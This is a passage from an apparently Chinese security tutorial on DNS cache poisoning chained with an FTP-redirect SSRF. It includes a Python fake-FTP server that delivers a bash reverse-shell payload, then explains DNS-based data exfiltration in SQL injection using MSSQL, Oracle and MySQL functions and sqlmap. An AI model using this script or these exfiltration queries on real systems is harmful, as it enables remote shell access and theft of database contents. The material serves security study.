        CNAME('ftp.a.testsweb.xyz', 'token.ftp.testsweb.xyz\\000.a.testsweb.xyz'),
        A('token.ftp.testsweb.xyz\\000.a.testsweb.xyz', 'X.X.X.X'), 
    ]
将`a.testsweb.xyz`的域名指定`b.testsweb.xyz`的DNS服务器解析，然后将`a.testweb.xyz`的A记录指向自己的服务器IP
完成构造，关闭`system-resolved`，并且以权威服务器模式打开Twisted
    sudo service systemd-resolved stop
    sudo twisted -n dns --pyzone a.testweb.xyz
只要查询一下`ftp.a.testweb.xyz`，就会命中DNS
Forwarder的缓存，`token.ftp.testweb.xyz`DNS缓存就会污染为我们服务器IP
    # -*- coding: utf-8 -*-    # @Time    : 2021/1/13 6:56 下午
    # @File    : ftp_redirect.py
    # @Software:
    import socket
    from urllib.parse import unquote
    # 对gopherus生成的payload进行一次urldecode
    payload = unquote("POST%20/shellcheck%20HTTP/1.1%0D%0AHost%3A%20127.0.0.1%0D%0AContent-Type%3A%20application/x-www-form-urlencoded%0D%0AContent-Length%3A%2083%0D%0A%0D%0Ashell%3Dbash%2520-c%2520%2522bash%2520- i%2520%253E%2526%2520/dev/tcp/{}/{}%25200%253E%25261%2522".format(shell_ip, shell_port))
    payload = payload.encode('utf-8')
    host = '0.0.0.0'
    port = 23
    sk = socket.socket()
    sk.bind((host, port))
    sk.listen(5)
    # ftp被动模式的passvie port,监听到1234
    sk2 = socket.socket()
    sk2.bind((host, 1234))
    sk2.listen()
    # 计数器，用于区分是第几次ftp连接
    count = 1
    while 1:
        conn, address = sk.accept()
        conn.send(b"200 \n")
        print(conn.recv(20))  # USER aaa\r\n  客户端传来用户名
        if count == 1:
            conn.send(b"220 ready\n")
        else:
            conn.send(b"200 ready\n")
        print(conn.recv(20))   # TYPE I\r\n  客户端告诉服务端以什么格式传输数据，TYPE I表示二进制， TYPE A表示文本
        if count == 1:
            conn.send(b"215 \n")
        else:
            conn.send(b"200 \n")
        print(conn.recv(20))  # SIZE /123\r\n  客户端询问文件/123的大小
        if count == 1:
            conn.send(b"213 3 \n")  
        else:
            conn.send(b"300 \n")
        print(conn.recv(20))  # EPSV\r\n'
        conn.send(b"200 \n")
        print(conn.recv(20))   # PASV\r\n  客户端告诉服务端进入被动连接模式
        if count == 1:
            conn.send(b"227 127,0,0,1,4,210\n")  # 服务端告诉客户端需要到哪个ip:port去获取数据,ip,port都是用逗号隔开，其中端口的计算规则为：4*256+210=1234
        else:
            conn.send(b"227 127,0,0,1,35,40\n")  # 端口计算规则：35*256+40=9000
        print(conn.recv(20))  # 第一次连接会收到命令RETR /123\r\n，第二次连接会收到STOR /123\r\n
        if count == 1:
            conn.send(b"125 \n") # 告诉客户端可以开始数据连接了
            # 新建一个socket给服务端返回我们的payload
            print("建立连接!")
            conn2, address2 = sk2.accept()
            conn2.send(payload)
            conn2.close()
            print("断开连接!")
        else:
            conn.send(b"150 \n")
            print(conn.recv(20))
            exit()
        # 第一次连接是下载文件，需要告诉客户端下载已经结束
        if count == 1:
            conn.send(b"226 \n")
        print(conn.recv(20)) # QUIT\r\n
        print("221 ")
        conn.send(b"221 \n")
        conn.close()
        count += 1
发送payload即可。
#### 解决方案
DNS缓存投毒这一漏洞的根本原因我认为是没有对DNS记录进行验证和过滤，以及主机名和域名存在差异性。解决这一漏洞最直接的方法，就是针对这两个特性，将接收到的DNS解析结果像对待用户输入一样的方式进行过滤，不过这样有可能导致传输速率降低。
### DNS中的SQL注入攻击
SQLMap现在已经可以自动完成这个任务，随着SQLMap的升级完成，攻击者可以使用此技术进行快速而低调的数据检索，尤其是在其他标准方法失败的情况下。当其他更快的SQL注入（SQLI）数据检索技术失败时，攻击者通常会使用逐位检索数据的方法，这是一个非常繁杂而费时的流程。因此，攻击者通常需要发送成千上万的请求来获取一个普通大小的表的内容。这里提到的是一种攻击者通过利用有漏洞数据库管理系统（DBMS）发起特制的DNS请求，并在另一端进行拦截来检索恶意SQL语句结果（例如管理员密码），每个循环可传输几十个结果字符的技术。
#### Microsoft SQL Server
扩展存储程序是一个直接运行在微软的地址空间库SQL服务器（MSSQL）的动态链接。有几个未被公开说明的扩展存储程序对于实现本文的目的特别有用的。
攻击者可以使用MicrosoftWindows通用命名约定（UNC）的文件和目录路径格式利用任何以下扩展存储程序引发DNS地址解析。Windows系统的UNC语法具有通用的形式：
`\\ComputerName\SharedFolder\Resource`
攻击者能够通过使用自定义制作的地址作为计算机名字段的值引发DNS请求。
##### master..xp_dirtree
扩展存储程序`master..xp_dirtree（）`用于获取所有文件夹的列表和给定文件夹内部的子文件夹：
`master..xp_dirtree''`
例如，要获得`C:\Windows run:`里的所有文件夹和子文件夹：
`EXECmaster..xp_dirtree 'C:\Windows';`
##### master..xp_fileexist
扩展存储程序`master..xp_fileexist（）`用于确定一个特定的文件是否存在于硬盘：`xp_fileexist
''`例如，要检查boot.ini文件是否存在于磁盘C 运行:
`EXECmaster..xp_fileexist 'C:\boot.ini';`
##### master..xp_subdirs
扩展存储程序`master..xp_subdirs（）`用于得到给定的文件夹内的文件夹列表：
`master..xp_subdirs''`
例如，要获得`C:\Windows`中的所有次级文件夹:
`EXECmaster..xp_subdirs 'C:\Windows';`
#### Oracle
Oracle提供的PL/ SQL包被捆绑在它的Oracle数据库服务器来扩展数据库功能。为了实现本文的目的，其中几个用于网络接入的包值得注意。
`UTL_INADDR.GET_HOST_ADDRESS`
`UTL_INADDR`包用于互联网的寻址--例如检索本地和远程主机的主机名和IP的地址。
它的成员函数`GET_HOST_ADDRESS()`用于检索特定主机的IP：
`UTL_INADDR.GET_HOST_ADDRESS('')`
例如，为了获得test.example.com的IP地址，运行：
`SELECTUTL_INADDR.GET_HOST_ADDRESS('test.example.com');`
##### UTL_HTTP.REQUEST
UTL_HTTP包用于从SQL和PL/SQL中标注出HTTP。它的程序REQUEST()回从给定的地址检索到的第1-2000字节的数据：`UTL_HTTP.REQUEST('')`
例如，为了获得
`SELECTUTL_HTTP.REQUEST('http://test.example.com/index.php') FROM DUAL;`
##### HTTPURITYPE.GETCLOB
HTTPURITYPE类的实例方法GETCLOB()返回从给定地址中检索到的CLOB（Character Large
Object）HTTPURITYPE('').GETCLOB()
例如，从页面
`SELECTHTTPURITYPE('http://test.example.com/index.php').GETCLOB() FROM DUAL;`
##### DBMS_LDAP.INIT
DBMS_LDAP包使得PL/SQL程序员能够访问轻量级目录访问协议（LDAP）服务器。它的程序INIT()用于初始化与LDAP服务器的会话：`DBMS_LDAP.INIT(('',)`
例如：初始化与主机test.example.com的连接运行：
`SELECTDBMS_LDAP.INIT(('test.example.com',80) FROM DUAL;`
攻击者可以使用任何以上提到的Oracle子程序发起DNS请求。然而，在Oracle
11g中，除了DBMS_LDAP.INIT()以外的所有可能导致网络访问子程序都受到限制。
#### MySQL
##### LOAD_FILE
MySQL的函数LOAD_FILE()读取文件内容并将其作为字符串返回：LOAD_FILE('')
例如，要获取C:\Windows\system.ini文件的内容运行：
`SELECTLOAD_FILE('C:\\Windows\\system.ini') ;`
#### 实操
在SQLMap运行时，`union`和`error-based`技术具有最高优先级，主要因为他们的速度快而且不需要特殊的要求。
因此，只有当inference技术方法是可用的，且选项`--dns-domain`被用户明确设置时，SQLMap才会打开对DNS渗出的支持。每个DNS解析请求结果都被按照RFC1034规定的DNS域名标准编码为十六进制格式。
这种方式使得最终一切非单词字符都能被保留。此外，表示较长的SQL查询结果的十六进制被分割。这是必须的，因为整个域名内的节点标签（如.example.）被限制在63个字符长度大小。
## 参考链接
[Data Retrieval over DNS in SQL Injection Attacks
(arxiv.org)](https://arxiv.org/ftp/arxiv/papers/1303/1303.3047.pdf)
[注入攻击新方式：通过DNS隧道传输恶意载荷 - 安全内参 | 决策者的网络安全知识库
(secrss.com)](https://www.secrss.com/articles/34460)